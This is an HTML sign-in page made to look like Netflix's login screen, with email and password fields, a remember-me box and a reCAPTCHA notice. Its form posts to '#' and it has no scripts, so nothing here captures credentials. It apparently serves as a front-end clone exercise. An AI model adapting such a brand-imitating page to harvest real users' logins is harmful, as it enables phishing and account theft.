<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix Sign In</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="signin-container">
        <h1>Sign In</h1>
        <form action="#" method="POST">
            <input type="email" name="email" placeholder="Email or mobile number" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
            <div class="secondary-options">
                <a href="#">Forgot password?</a>
                <br>
                <a href="#">New to Netflix? Sign up now.</a>
            </div>
            <div class="remember-me">
                <input type="checkbox" name="remember">
                <label for="remember">Remember me</label>
            </div>
        </form>
        <p class="captcha-note">This page is protected by Google reCAPTCHA to ensure you're not a bot. <a href="#">Learn more</a>.</p>
    </div>
</body>
</html>
